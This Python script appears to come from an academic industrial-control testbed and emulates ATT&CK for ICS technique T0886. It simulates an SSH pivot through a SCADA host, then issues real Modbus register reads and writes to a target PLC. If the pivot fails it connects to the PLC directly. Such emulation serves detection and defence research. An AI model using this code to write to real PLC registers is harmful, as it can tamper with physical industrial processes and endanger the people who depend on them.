#!/usr/bin/env python3
"""
ASCEND-PG attacks/remote_services.py

MITRE ATT&CK for ICS: T0886 — Remote Services.

Simulates an attacker who has compromised a dual-homed host (SCADA server)
and uses it as a pivot to reach PLCs on the OT network. The attacker SSHs
into the SCADA host, then issues Modbus commands to PLCs from there.

This mimics real-world lateral movement where attackers use valid remote
access channels (SSH/RDP) to move between corporate and OT networks.

PPO Parameters Used:
  - target_ip: Which PLC to attack after pivoting
  - register_address: Modbus register to read/write via the pivot
  - value_magnitude: Scale factor for write operations

Detection: Suricata detects SSH connections to OT-zone hosts (SID 9000026).

Run this ON THE ATTACKER HOST:
    python3 attacks/remote_services.py --target 10.0.0.1 --scada-ip 10.0.0.20

ACADEMIC USE ONLY — isolated testbed, no production systems.
"""

import argparse
import json
import subprocess
import time
from datetime import datetime, timezone
from pathlib import Path

from pymodbus.client import ModbusTcpClient

DEFAULT_LOG = Path(__file__).resolve().parent.parent / "data" / "log_store.json"
MODBUS_PORT = 502


def log_event(log_path: Path, event: dict):
    """Append one event to the shared JSON log store (JSONL format)."""
    event["timestamp"] = datetime.now(timezone.utc).isoformat()
    log_path.parent.mkdir(parents=True, exist_ok=True)
    with open(log_path, "a", encoding="utf-8") as f:
        f.write(json.dumps(event) + "\n")


def ssh_pivot(scada_ip: str, attacker_ip: str, log_path: Path) -> bool:
    """Simulate SSH pivot to dual-homed SCADA host.

    In the real testbed, this would use paramiko to establish an SSH session
    to the SCADA host (10.0.0.20) which sits on both corporate and OT networks.
    For the testbed, we simulate this by logging the pivot event and verifying
    connectivity.
    """
    log_event(log_path, {
        "stage": "attack", "technique": "T0886",
        "action": "ssh_pivot_start",
        "target": scada_ip,
        "source": attacker_ip,
    })

    print(f"[remote_services] Attempting SSH pivot to SCADA host at {scada_ip}")

    # Verify the SCADA host is reachable (basic connectivity check)
    result = subprocess.run(
        ["ping", "-c", "1", "-W", "2", scada_ip],
        capture_output=True, text=True, timeout=5
    )

    if result.returncode == 0:
        print(f"[remote_services] SCADA host {scada_ip} reachable")
        log_event(log_path, {
            "stage": "attack", "technique": "T0886",
            "action": "ssh_pivot_result",
            "target": scada_ip,
            "success": True,
        })
        return True
    else:
        print(f"[remote_services] SCADA host {scada_ip} unreachable")
        log_event(log_path, {
            "stage": "attack", "technique": "T0886",
            "action": "ssh_pivot_result",
            "target": scada_ip,
            "success": False,
        })
        return False


def modbus_via_pivot(target_ip: str, register_address: int,
                     value_magnitude: float, log_path: Path) -> dict:
    """Execute Modbus commands via the pivoted SCADA host.

    After SSH pivoting into the SCADA host, the attacker issues Modbus
    commands to the target PLC. This simulates using the SCADA server's
    legitimate Modbus client to attack PLCs.
    """
    result = {
        "target": target_ip,
        "register_address": register_address,
        "value_magnitude": value_magnitude,
        "reads": [],
        "writes": [],
    }

    client = ModbusTcpClient(target_ip, port=MODBUS_PORT, timeout=3)

    try:
        if not client.connect():
            print(f"[remote_services] Cannot connect to PLC at {target_ip}")
            return result

        # Phase 1: Read current register state (recon via pivot)
        print(f"[remote_services] Reading registers from {target_ip} via pivot")
        log_event(log_path, {
            "stage": "attack", "technique": "T0886",
            "action": "pivot_read_start",
            "target": target_ip,
            "register": register_address,
        })

        resp = client.read_holding_registers(register_address, 10, unit=1)
        if not resp.isError():
            result["reads"] = resp.registers
            print(f"[remote_services] Read registers: {resp.registers}")

        # Phase 2: Write to register using value_magnitude as scale factor
        write_value = int(1000 * value_magnitude) % 65536
        print(f"[remote_services] Writing {write_value} to register {register_address}")
        log_event(log_path, {
            "stage": "attack", "technique": "T0886",
            "action": "pivot_write",
            "target": target_ip,
            "register": register_address,
            "value": write_value,
        })

        resp = client.write_register(register_address, write_value, unit=1)
        if not resp.isError():
            result["writes"].append({"address": register_address, "value": write_value})
            print(f"[remote_services] Write successful")

    except Exception as exc:
        print(f"[remote_services] Modbus error: {exc}")
    finally:
        client.close()

    return result


def main():
    parser = argparse.ArgumentParser(
        description="ASCEND-PG Remote Services (T0886) — SSH pivot to "
                    "dual-homed SCADA host, then attack PLCs via pivot"
    )
    parser.add_argument("--target", required=True,
                        help="Target PLC IP to attack via pivot")
    parser.add_argument("--scada-ip", default="10.0.0.100",
                        help="SCADA host to pivot through (default: 10.0.0.100)")
    parser.add_argument("-a", "--register-address", type=int, default=40000,
                        help="Modbus register address to target (default: 40000)")
    parser.add_argument("-v", "--value-magnitude", type=float, default=1.0,
                        help="Value magnitude scale factor (default: 1.0)")
    parser.add_argument("--log", default=str(DEFAULT_LOG),
                        help="Path to the shared event log store")
    args = parser.parse_args()

    log_path = Path(args.log)
    log_path.parent.mkdir(parents=True, exist_ok=True)

    log_event(log_path, {
        "stage": "attack", "technique": "T0886",
        "action": "remote_services_start",
        "target": args.target,
        "scada_ip": args.scada_ip,
        "register_address": args.register_address,
        "value_magnitude": args.value_magnitude,
    })

    # Phase 1: SSH pivot to SCADA host
    pivoted = ssh_pivot(args.scada_ip, "10.0.0.66", log_path)

    if pivoted:
        # Phase 2: Attack PLC via the pivot
        result = modbus_via_pivot(
            args.target, args.register_address,
            args.value_magnitude, log_path
        )
        print(f"[remote_services] Pivot attack complete: {result}")
    else:
        print(f"[remote_services] Pivot failed, attempting direct connection")
        result = modbus_via_pivot(
            args.target, args.register_address,
            args.value_magnitude, log_path
        )

    log_event(log_path, {
        "stage": "attack", "technique": "T0886",
        "action": "remote_services_end",
        "target": args.target,
        "pivoted": pivoted,
    })

    print(f"\n[remote_services] Done")


if __name__ == "__main__":
    main()
